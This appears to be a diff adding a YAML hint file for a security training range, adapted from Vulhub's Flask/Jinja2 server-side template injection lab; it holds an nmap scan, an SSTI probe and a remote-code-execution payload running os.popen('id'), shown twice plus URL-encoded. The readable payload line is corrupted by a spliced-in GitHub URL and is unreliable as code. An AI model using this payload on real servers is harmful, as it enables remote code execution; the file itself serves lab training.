@@ -1,0 +1,117 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: flask/ssti
+hint_levels:
+  low:
+  - Inspect the flask service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8000. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8000 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): web: 8000/tcp → container 8000/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8000/`.'
+  high:
+  - 'Vulnerability: Flask (Jinja2) Server-Side Template Injection.'
+  - |-
+    Vulnerability Reproduction
+
+    First, verify the SSTI vulnerability exists by visiting:
+
+    ```
+    http://{{NODE_IP}}:8000/?name={{233*233}}
+    ```
+
+    If you see the result `54289`, it confirms the presence of the SSTI vulnerability.
+
+    To achieve remote code execution, you can use the following POC that obtains the `eval` function and executes arbitrary Python code:
+
+    ```python
+    {% for c in [].__class__.__base__.__subclasses__() %}
+    {% if c.__name__ == 'catch_warnings' %}
+      {% for b in c.__init__.__globals__.values() %}
+      {% if b.__class__ == {}.__class__ %}
+        {% if 'eval' in b.keys() %}
+          {{ b'eval': https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/flask/ssti/%27__import__%28%22os%22.popen("id").read()') }}
+        {% endif %}
+      {% endif %}
+      {% endfor %}
+    {% endif %}
+    {% endfor %}
+    ```
+
+    Visit the following URL (with the POC URL-encoded) to execute the command:
+
+    ```
+    http://{{NODE_IP}}:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
+    ```
+
+    The command execution result will be displayed:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/flask/ssti/1.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/flask/ssti/README.md'
+  - |-
+    Additional public references:
+    - https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
+    - http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates
+access_instructions:
+  title: Flask (Jinja2) Server-Side Template Injection
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8000. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8000 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): web: 8000/tcp → container 8000/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8000/`.
+  - title: Vulnerability Reproduction
+    instructions: |-
+      First, verify the SSTI vulnerability exists by visiting:
+
+      ```
+      http://{{NODE_IP}}:8000/?name={{233*233}}
+      ```
+
+      If you see the result `54289`, it confirms the presence of the SSTI vulnerability.
+
+      To achieve remote code execution, you can use the following POC that obtains the `eval` function and executes arbitrary Python code:
+
+      ```python
+      {% for c in [].__class__.__base__.__subclasses__() %}
+      {% if c.__name__ == 'catch_warnings' %}
+        {% for b in c.__init__.__globals__.values() %}
+        {% if b.__class__ == {}.__class__ %}
+          {% if 'eval' in b.keys() %}
+            {{ b'eval': https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/flask/ssti/%27__import__%28%22os%22.popen("id").read()') }}
+          {% endif %}
+        {% endif %}
+        {% endfor %}
+      {% endif %}
+      {% endfor %}
+      ```
+
+      Visit the following URL (with the POC URL-encoded) to execute the command:
+
+      ```
+      http://{{NODE_IP}}:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
+      ```
+
+      The command execution result will be displayed:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/flask/ssti/1.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/flask/ssti/README.md
+  readme_sha256: fbcc67c81072e6c19c3d9a4adcfea492d51206fa986396f41183fba46a907755
+  compose_sha256: 704d6217fc29c8e61c4054b8d2e5dfc796752c5bacc318c779b7139c42994942
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
